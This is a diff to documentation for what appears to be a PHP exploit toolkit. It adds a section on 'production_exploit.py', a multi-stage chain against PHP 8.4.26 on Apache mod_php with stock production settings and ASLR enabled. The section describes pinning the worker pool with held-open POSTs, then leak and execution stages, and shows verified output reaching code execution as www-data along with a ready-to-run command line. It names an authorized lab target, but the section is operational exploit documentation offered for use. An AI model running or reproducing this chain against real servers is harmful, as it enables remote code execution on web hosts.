@@ -255,3 +255,43 @@ FPM/CLI profiles are marked `build_specific`. `fingerprint.py` will show them
 but will not auto-run one by version alone; pass `--profile` for the exact
 image/build, or calibrate it. This prevents the upstream minimal-build 8.4
 profile from being mistaken for the official `php:8.4.26-fpm` image.
+
+## Production PHP 8.4.26 chain (own implementation)
+
+`production_exploit.py` is our own A1/B1/A2/B2 implementation for:
+
+- PHP 8.4.26, Apache prefork `mod_php`
+- stock `php.ini-production`
+- `display_errors=Off`, `128M` memory, `8M` post limit
+- ASLR enabled
+- official `MaxRequestWorkers=150`
+- no exploit-side INI or MPM changes
+
+It pins the pool by holding `--workers - 1` incomplete POSTs open, then runs
+the leak/execution stages on the remaining child. A1/B1 use chunked transport;
+A2/B2 use fixed-length multipart.
+
+Verified on the official `php:8.4.26-apache` image with the stock
+`php.ini-production` and all 150 workers:
+
+```text
+A1=1061530 B1=32674021 A2=279369
+pinned 150/150 workers
+arch=x86_64 libphp=... main=...
+B2=451384
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Run it against an authorized lab target with a writable `/out`:
+
+```bash
+python3 production_exploit.py \
+    --host 127.0.0.1 --port 1337 --workers 150 \
+    --host-proof /path/to/out/p1
+```
+
+The target must already have a PHP page and `/out`; the exploit does not change
+the PHP configuration. The x86_64 path is verified. The aarch64 offsets are
+present but have not been verified on real ARM hardware. Concurrent-load
+behavior is still under test; the current pinning assumes requests are not
+competing for the final free worker.
